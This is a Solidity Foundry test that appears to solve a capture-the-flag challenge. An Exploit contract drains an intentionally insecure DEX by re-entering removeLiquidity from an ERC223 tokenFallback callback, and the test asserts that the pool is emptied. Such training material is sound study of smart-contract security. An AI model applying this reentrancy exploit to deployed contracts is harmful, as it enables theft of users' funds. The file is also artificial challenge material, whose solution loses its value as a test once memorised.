// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";

import {SimpleERC223Token} from "../src/tokens/tokenERC223.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";


contract Challenge2Test is Test {
    InsecureDexLP target; 
    IERC20 token0;
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        
        token0 = IERC20(new InSecureumToken(10 ether));
        token1 = IERC20(new SimpleERC223Token(10 ether));
        
        target = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(target), type(uint256).max);
        token1.approve(address(target), type(uint256).max);
        target.addLiquidity(9 ether, 9 ether);

        token0.transfer(player, 1 ether);
        token1.transfer(player, 1 ether);
        vm.stopPrank();

        vm.label(address(target), "DEX");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "SimpleERC223Token");
    }

    function testChallenge2() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/      

        Exploit exploit = new Exploit(token0, token1, target, player);
        
        token0.approve(address(exploit), 1 ether);
        token1.approve(address(exploit), 1 ether);
        
        exploit.addFunds();
        exploit.addLiquidity();
        exploit.removeLiquidity();
        exploit.transferToPlayer();
        
        //============================//

        vm.stopPrank();

        assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
        assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
        assertEq(token0.balanceOf(address(target)), 0, "Dex should be empty (token0)");
        assertEq(token1.balanceOf(address(target)), 0, "Dex should be empty (token1)");

    }
}



/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/


contract Exploit {
    IERC20 public token0; // this is insecureumToken
    IERC20 public token1; // this is simpleERC223Token
    InsecureDexLP public dex;
    address public player;
    bool private executeFallback;

    constructor (IERC20 _token0, IERC20 _token1, InsecureDexLP _dex, address _player){
        token0 = _token0;
        token1 = _token1;
        dex = _dex;
        player = _player;
    }

    function addFunds() public {
        token0.transferFrom(player, address(this), 1 ether);
        token1.transferFrom(player, address(this), 1 ether);
    }

    function transferToPlayer() public {
        token0.transfer(player, token0.balanceOf(address(this)));
        token1.transfer(player, token1.balanceOf(address(this)));
    }

    function addLiquidity() public {
        token0.approve(address(dex), 1 ether);
        token1.approve(address(dex), 1 ether);
        dex.addLiquidity(1 ether, 1 ether);
    }

    function removeLiquidity() public {
        executeFallback = true;
        dex.removeLiquidity(1 ether);
    }

    function tokenFallback(address, uint256, bytes memory) external {
        if (executeFallback){
            (bool success,) = address(dex).call(abi.encodeWithSignature("removeLiquidity(uint256)", 1 ether));
            executeFallback = success;
        }
    }
}